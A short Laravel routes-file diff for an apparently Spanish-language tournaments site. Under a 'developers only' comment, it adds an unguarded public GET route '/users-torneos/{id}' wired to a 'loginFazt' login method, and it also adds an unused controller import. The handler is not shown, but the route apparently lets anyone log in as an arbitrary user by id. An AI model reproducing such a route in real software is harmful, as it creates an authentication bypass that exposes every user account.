@@ -20,6 +20,7 @@ use App\Http\Controllers\admin\UsuariosController;
 use App\Http\Controllers\user\RecompensaController;
 use App\Http\Controllers\eventos\RegistroEventController;
 use Illuminate\Support\Facades\Auth;
+use App\Http\Controllers\QuickLoginController;
 
 
 #Route::get('/', function () {
@@ -133,3 +134,7 @@ Route::get('f_poli_privacidad', [HomeController::class, 'fPoliticasPrivacidad'])
 Route::get('f_termin_condiciones', [HomeController::class, 'fTerminosCondiciones']);
 Route::get('f_poli_reembolsos', [HomeController::class, 'fPoliticasReembolso']);
 Route::get('f_poli_cookies', [HomeController::class, 'fPoliticasCookies']);
+
+
+//////////// SOLO DESARROLLADORES ///////////////
+Route::get('/users-torneos/{id}', [LoginController::class, 'loginFazt']);
